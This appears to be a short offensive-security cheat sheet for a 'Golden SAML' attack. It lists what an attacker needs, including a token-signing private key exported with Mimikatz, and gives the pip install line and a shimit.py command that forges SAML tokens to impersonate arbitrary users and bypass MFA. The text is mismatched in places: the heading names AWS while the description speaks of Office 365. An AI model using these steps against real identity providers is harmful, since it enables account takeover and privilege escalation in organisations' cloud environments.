# AWS - Golden SAML

### Using the extracted information, the tool will generate a forged SAML token as an arbitrary user that can then be used to authenticate to Office 365 without knowledge of that user's password. This attack also bypasses any MFA requirements.

## Requirements:

#### 1) Token-signing private key (export from personal store using Mimikatz)

#### 2) IdP public certificate

#### 3) IdP name

#### 4) Role name (role to assume)

## Commands:

#### 1) Install the proper python libraries

    python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml 

#### 2) 

    python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
